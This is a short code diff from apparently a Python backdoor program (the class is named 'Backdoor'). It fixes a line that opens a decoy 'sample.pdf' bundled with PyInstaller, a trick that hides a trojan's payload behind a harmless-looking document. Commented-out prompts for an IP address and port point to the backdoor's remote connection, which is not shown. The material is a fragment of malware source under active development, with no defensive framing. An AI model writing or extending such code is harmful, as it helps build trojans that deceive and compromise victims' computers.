@@ -94,7 +94,7 @@ class Backdoor:
 
     
 file_name = sys._MEIPASS + "\sample.pdf" #sys._MEIPASS = default location used by pyinstaller
-subprocess.Popen(file_name), shell=True)
+subprocess.Popen(file_name, shell=True)
     
 #ip = raw_input("Enter IP Address: ")
 #port = int(raw_input("Enter port number to use: "))
